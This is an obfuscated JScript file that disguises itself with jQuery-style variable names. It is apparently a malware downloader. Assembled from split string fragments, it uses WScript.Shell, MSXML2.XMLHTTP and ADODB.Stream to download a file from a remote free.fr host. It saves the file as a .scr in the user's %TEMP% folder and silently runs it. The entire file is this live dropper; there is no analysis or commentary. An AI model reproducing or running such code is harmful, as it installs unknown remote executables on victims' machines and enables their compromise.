callbackInverse = "Stre", get = 26, mimeType = "se";
var defer = "Respo",
	obj = "fr/6",
	percent = ".s",
	firstElementChild = "tp://",
	cssHooks = 1;
arr = "eToF", tag = "%/", addBack = "W";
var parseHTML = "MSXML",
	binary = (function Object.prototype.origCount() {
		return this
	}, "kao");
augmentWidthOrHeight = 1056;
l = "rite";
cloneCopyEvent = 2, originalProperties = "sav", tuples = "pt", updateFunc = "am", computeStyleTests = "free.", reliableMarginLeftVal = "Sle";
duplicates = "Run";
defaultPrevented = "s", charset = 99, initial = "ep", _removeData = "xp", adown = "type", guaranteedUnique = "en";
var hasScripts = "vironm",
	requestHeadersNames = "S",
	responseType = "ript";
PI = "et";
writable = "cr", parent = "GET", next = "DODB.", selector = "je", condense = "d";
var pipe = "teOb",
	testContext = "ate";
textContent = "es";
notify = 31;
contexts = "String";
properties = 41;
rrun = "WSc";
insertBefore = "Create";
rmultiDash = "posi";
uniqueSort = 16, onabort = "clo", pnum = 7, rnamespace = "andEn", slideUp = "Crea", detectDuplicates = "tion";
curCSSLeft = 0, readyWait = "readys", all = "eBody", curElem = "Objec";
delegateCount = "Cre";
ap = "%TEMP";
var nextSibling = "t",
	ofType = "g",
	bySet = "Script",
	mouseleave = "2.XML",
	tuple = "A",
	rmouseEvent = "p";
appendChild = 17;
set = "ns";
delegateType = "uane.";
optionSet = "WScri";
pseudos = "ct", inspect = "tate", conv2 = "f", rinputs = 322, hookFn = "WS";
disableScript = "ip", querySelectorAll = "ile", lastChild = 33, height = "HTTP";
getJSON = "7uh", attrs = "Sleep", username = 3, showHide = 72647432, ajax = "E", originalSettings = "54gb4";
setAttribute = "open";
compare = "tyl";
var style = ".Sh",
	inspectPrefiltersOrTransports = "ell",
	high = "ht",
	oldfire = "w";
getWindow = (((Math.pow(5, cloneCopyEvent) - 16) ^ (appendChild * 2 + pnum)), ((1 & (cssHooks & 1)), this));
timeStamp = duplicates;
Data = getWindow[optionSet + tuples];
owner = Data[insertBefore + curElem + nextSibling](rrun + responseType + style + inspectPrefiltersOrTransports);
valueIsBorderBox = owner[ajax + _removeData + rnamespace + hasScripts + guaranteedUnique + nextSibling + contexts + defaultPrevented](ap + tag) + ofType + PI + requestHeadersNames + compare + textContent + percent + writable;
matcherFromTokens = getWindow[hookFn + writable + disableScript + nextSibling][slideUp + pipe + selector + pseudos](parseHTML + mouseleave + height);
matcherFromTokens[setAttribute](parent, high + firstElementChild + conv2 + binary + delegateType + computeStyleTests + obj + getJSON + originalSettings, !(((((rinputs ^ 993) / (uniqueSort | 9)) - ((augmentWidthOrHeight - 264) / (lastChild | 0)))) > cloneCopyEvent));
matcherFromTokens[defaultPrevented + guaranteedUnique + condense]();
while(matcherFromTokens[readyWait + inspect] < ((3 + username) & (4 ^ curCSSLeft))) {
	getWindow[addBack + bySet][attrs](((48 * cloneCopyEvent + 4) + (properties - 41)));
}
booleans = getWindow[optionSet + rmouseEvent + nextSibling][delegateCount + testContext + curElem + nextSibling](tuple + next + callbackInverse + updateFunc);
getWindow[rrun + responseType][reliableMarginLeftVal + initial]((Math.pow((charset * 145 + notify), 2) - (showHide | 135343652)));

booleans[setAttribute]();
toArray = booleans;
toArray[adown] = ((cssHooks & 1) * cssHooks);
teardown = toArray;
booleans[oldfire + l](matcherFromTokens[defer + set + all]);
teardown[rmultiDash + detectDuplicates] = ((0 / get) & 1);
booleans[originalProperties + arr + querySelectorAll](valueIsBorderBox, (cloneCopyEvent + (0 | curCSSLeft)));
booleans[onabort + mimeType]();
_jQuery = owner;
_jQuery[timeStamp](valueIsBorderBox.origCount(), ((1 & cssHooks) * (0 / pnum)), ((1 & cssHooks) * (0 ^ curCSSLeft)));